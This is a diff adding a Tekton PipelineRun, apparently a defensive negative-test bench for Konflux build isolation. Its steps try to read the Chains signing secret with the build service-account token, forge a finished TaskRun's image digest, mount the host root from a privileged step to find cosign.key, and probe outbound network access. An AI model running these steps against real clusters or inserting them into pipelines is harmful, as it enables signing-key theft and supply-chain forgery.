@@ -1,0 +1,61 @@
+# Banc A1 : PipelineRun « hostile » déclaré dans .tekton/ par un contributeur (PR), comme
+# n'importe quel pipeline Konflux : c'est le seul moyen offert aux tenants de lancer un build.
+# Il exerce les tests négatifs du doc 01 que Konflux pourrait bloquer à l'admission ou à
+# l'exécution. N'imprime que des codes HTTP et des empreintes, jamais de secret.
+#   T1 : lire la clé de signature de Chains (API Kubernetes, puis fichier sur le nœud) ;
+#   T2 : taskSpec inline (ce PipelineRun lui-même) ;
+#   T3 : modifier le status d'un TaskRun terminé avec le jeton du build ;
+#   T4 : étape privilégiée et volume hostPath ;
+#   T6 : connexion réseau sortante depuis une étape de build.
+apiVersion: tekton.dev/v1
+kind: PipelineRun
+metadata:
+  name: tests-negatifs
+  annotations:
+    pipelinesascode.tekton.dev/on-cel-expression: event == "pull_request" && source_branch == "tests-negatifs"
+  labels:
+    appstudio.openshift.io/application: sample-app
+    appstudio.openshift.io/component: sample-app
+spec:
+  taskRunTemplate:
+    serviceAccountName: build-pipeline-sample-app
+  pipelineSpec:
+    tasks:
+      - name: sonde
+        taskSpec:
+          volumes:
+            - name: hote
+              hostPath:
+                path: /
+          steps:
+            - name: t1-t3-api
+              image: quay.io/konflux-ci/task-runner@sha256:9f4151ff21f4c14b9151582c91a5542140bbbb6dca7861cd42081006840bec05
+              script: |
+                #!/bin/sh
+                sa=/var/run/secrets/kubernetes.io/serviceaccount
+                api() { curl -s -o /dev/null -w '%{http_code}' --cacert $sa/ca.crt -H "Authorization: Bearer $(cat $sa/token)" "$@"; }
+                echo "T1 API : GET secret tekton-pipelines/signing-secrets -> HTTP $(api https://kubernetes.default.svc/api/v1/namespaces/tekton-pipelines/secrets/signing-secrets)"
+                tr=$(curl -s --cacert $sa/ca.crt -H "Authorization: Bearer $(cat $sa/token)" \
+                  "https://kubernetes.default.svc/apis/tekton.dev/v1/namespaces/$(cat $sa/namespace)/taskruns" | jq -r '[.items[] | select(.status.completionTime != null)][0].metadata.name // "aucun"')
+                echo "T3 API : PATCH status du TaskRun terminé $tr -> HTTP $(api -X PATCH -H 'Content-Type: application/merge-patch+json' \
+                  -d '{"status": {"results": [{"name": "IMAGE_DIGEST", "type": "string", "value": "sha256:falsifie"}]}}' \
+                  "https://kubernetes.default.svc/apis/tekton.dev/v1/namespaces/$(cat $sa/namespace)/taskruns/$tr/status")"
+            - name: t4-t1-noeud
+              image: quay.io/konflux-ci/task-runner@sha256:9f4151ff21f4c14b9151582c91a5542140bbbb6dca7861cd42081006840bec05
+              securityContext:
+                privileged: true
+                runAsUser: 0
+              volumeMounts:
+                - name: hote
+                  mountPath: /hote
+              script: |
+                #!/bin/sh
+                echo "T4 : étape lancée, uid=$(id -u), privilégiée=$(grep -q CapEff:.000001ffffffffff /proc/self/status && echo oui || grep CapEff /proc/self/status), hostPath / monté : $(ls /hote/etc/kubernetes/manifests 2>/dev/null | tr '\n' ' ')"
+                f=$(ls /hote/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/signing-secrets/cosign.key 2>/dev/null | head -1)
+                if [ -n "$f" ]; then echo "T1 noeud : clé de Chains lue depuis la tâche, sha256 $(sha256sum "$f" | cut -c1-64)"; else echo "T1 noeud : clé introuvable"; fi
+            - name: t6-reseau
+              image: quay.io/konflux-ci/task-runner@sha256:9f4151ff21f4c14b9151582c91a5542140bbbb6dca7861cd42081006840bec05
+              script: |
+                #!/bin/sh
+                echo "T6 : HEAD https://quay.io/ depuis l'étape -> HTTP $(curl -s -m 10 -o /dev/null -w '%{http_code}' -I https://quay.io/)"
+                echo "T6 : https://forgejo.banc-a1.svc.cluster.local depuis l'étape -> HTTP $(curl -s -m 10 -k -o /dev/null -w '%{http_code}' https://forgejo.banc-a1.svc.cluster.local/api/healthz)"
